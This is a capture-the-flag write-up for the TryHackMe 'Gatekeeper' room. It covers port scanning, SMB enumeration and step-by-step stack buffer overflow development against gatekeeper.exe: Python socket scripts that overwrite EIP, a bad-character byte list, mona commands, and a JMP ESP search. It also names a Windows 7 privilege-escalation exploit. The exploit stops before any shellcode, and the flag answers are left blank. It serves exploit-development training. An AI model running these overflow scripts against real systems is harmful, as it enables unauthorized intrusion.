---
title: Practical - Gatekeeper
published: true
---

[https://tryhackme.com/room/gatekeeper](https://tryhackme.com/room/gatekeeper)

Can you get past the gate and through the fire?

![](/assets/balrog.jpg)

* * *

## [](#header-2)Defeat the Gatekeeper and pass through the fire. 

Defeat the Gatekeeper to break the chains.  But beware, fire awaits on the other side.

### [](###header-3)NMap Scans

| PORT | STATE | SERVICE | REASON |
|------|-------|---------|--------|
| 135/tcp | open | msrpc | syn-ack ttl 125 |
| 139/tcp | open | netbios-ssn | syn-ack ttl 125 |
| 445/tcp | open | microsoft-ds | syn-ack ttl 125 |
| 3389/tcp | open | ms-wbt-server | syn-ack ttl 125 |
| 31337/tcp | open | Elite | syn-ack ttl 125 |
| 49152/tcp | open | unknown | syn-ack ttl 125 |
| 49153/tcp | open | unknown | syn-ack ttl 125 |
| 49154/tcp | open | unknown | syn-ack ttl 125 |
| 49155/tcp | open | unknown | syn-ack ttl 125 |
| 49161/tcp | open | unknown | syn-ack ttl 125 |

* * * 

### [](###header-3)Port 445 - SMB

- ``smbclient -L ip`` - check for shares we can browse
- Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
- Check share directory for gatekeeper.exe and get it over to windows 7 vm to see if we can overflow
- lets set mona working folder in immunity as well ``!mona config -set workingfolder c:\mona\%p``

![](/assets/gatekeeper01.png)

- Send through 5000 a's and see if we can overwrite the EIP register
- lets run our a.py ``print ("A" *5000)`` and send through the A's via netcat

![](/assets/gatekeeper02.png)

- Now lets find our offset.

- ``msf-pattern_create -l 5000`` and send in netcat and note the EIP "39654138"

![](/assets/gatekeeper03.png)

- ``msf-pattern_offset -l 5000 -q 39654138`` and look for an exact match offset 

![](/assets/gatekeeper04.png)

- Since we have an exact offset at 146 lets edit our code to send payloads so we can look for badchars.

```python
import socket
import sys

offset = 146
payload = b"A" * offset + b"B" * 4

try:
      print("Sending Payload...")
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(('192.168.0.24',31337))
      s.send(payload + b'\r\n')
      print("Payload sent...")
      s.close()

except:
      print("Cannot connect to the server")
      sys.exit()
```

![](/assets/gatekeeper05.png)

- we control the EIP since we have overwritten with our B's 42424242
- find badchars - update our code with the badchard variable from [Cytopia](https://github.com/cytopia/badchars)

```python
import socket
import sys

offset = 146
payload = b"A" * offset + b"B" * 4
badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

try:
      print("Sending Payload...")
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(('192.168.0.24',31337))
      s.send(payload + badchars + b'\r\n')
      print("Payload sent...")
      s.close()

except:
      print("Cannot connect to the server")
      sys.exit()
```

- send through our exploit.py and it should crash. we can rick click on ESP and **follow in dump**.
- ``!mona modules`` find protection modules
- We can see that gatekeeper.exe gives us False ASLR so we can use that to find our jumppoint
- ``!mona find -s "\xff\xe4" -m gatekeeper.exe``

![080414C3](/assets/gatekeeper06.png)


### [](###header-3)Exploits

- Microsoft Windows 7 build 7601 (x86) - Local Privilege Escalation | windows_x86/local/47176.cpp


##### [](#header-5)Answer the questions below

**Locate and find the User Flag.**



**Locate and find the Root Flag**



* * *



